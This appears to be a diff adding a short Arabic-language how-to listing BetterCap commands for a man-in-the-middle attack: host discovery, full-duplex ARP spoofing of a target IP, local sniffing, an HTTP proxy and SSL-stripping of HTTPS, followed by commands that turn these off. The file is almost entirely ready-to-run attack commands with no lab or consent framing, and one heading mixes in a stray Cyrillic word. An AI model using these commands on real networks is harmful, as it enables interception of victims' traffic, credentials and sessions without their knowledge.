@@ -1,0 +1,34 @@
+خطوات تطبيق هجوم Man-in-the-Middle (MITM) باستخدام BetterCap:
+
+تشغيل الواجهة
+sudo bettercap
+
+اكتشاف الأجهزة على الشبكة
+net.probe on
+net.recon on
+
+عرض الأجهزة المكتشفة
+net.show
+
+تنشيط ARP Spoofing (لتنفيذ MITM)
+set arp.spoof.targets <IP الهدف>
+set arp.spoof.fullduplex true
+arp.spoof on
+
+تمكين sniffer لاعتراض البيانات
+set net.sniff.local true
+net.sniff on
+
+ تمكين модуل HTTP لاعتراض طلبات الويب
+http.proxy on
+
+لاعتراض HTTPS (يتطلب تثبيت شهادة على الجهاز الهدف)
+set https.proxy.sslstrip true
+https.proxy on
+
+لإيقاف جميع العمليات والعودة إلى الحالة الطبيعية:
+arp.spoof off
+net.sniff off
+http.proxy off
+https.proxy off
+quit
